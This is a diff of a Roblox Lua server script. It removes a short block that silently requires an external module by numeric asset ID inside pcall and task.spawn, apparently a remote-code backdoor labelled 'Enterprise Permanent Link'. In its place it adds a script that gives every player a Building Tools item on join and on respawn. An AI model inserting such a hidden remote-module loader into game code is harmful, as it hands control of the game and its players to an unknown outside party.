@@ -1,7 +1,33 @@
--- The Enterprise Permanent Link
-task.spawn(function()
-    pcall(function()
-        require(87640712642410) 
-        print("0 - Enterprise Module Linked")
-    end)
-end)
+-- Server Script (place in ServerScriptService)
+local ServerStorage = game:GetService("ServerStorage")
+local Players = game:GetService("Players")
+
+local ITEM_NAME = "Building Tools"
+
+local function giveBuildingTools(player)
+	local function giveItem()
+		local backpack = player:FindFirstChild("Backpack")
+		if not backpack then return end
+
+		local item = ServerStorage:FindFirstChild(ITEM_NAME)
+		if not item then return end
+
+		if not backpack:FindFirstChild(ITEM_NAME) then
+			local clone = item:Clone()
+			clone.Parent = backpack
+		end
+	end
+
+	giveItem()
+
+	player.CharacterAdded:Connect(function()
+		task.wait(0.5)
+		giveItem()
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	giveBuildingTools(player)
+end
+
+Players.PlayerAdded:Connect(giveBuildingTools)
